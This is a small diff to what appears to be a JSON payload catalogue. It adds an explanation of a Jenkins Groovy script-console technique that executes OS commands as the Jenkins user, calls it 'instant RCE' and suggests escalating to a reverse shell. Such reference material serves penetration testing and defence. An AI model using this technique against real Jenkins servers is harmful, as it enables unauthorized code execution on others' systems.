@@ -90,5 +90,6 @@
       "MITRE T1059.007",
       "MITRE T1552.001"
     ]
-  }
+  },
+  "explain": "Runs an OS command from the Jenkins Groovy script console (/script):\n  def cmd = '<command>'          the command to execute\n  def proc = cmd.execute()       run it\n  consumeProcessOutput(sout,serr) + waitForOrKill   capture stdout/stderr\n  println sout                   print the result\nExecutes as the Jenkins user - instant RCE with admin (or misconfigured anonymous) access to the console; escalate from there to a full reverse shell."
 }
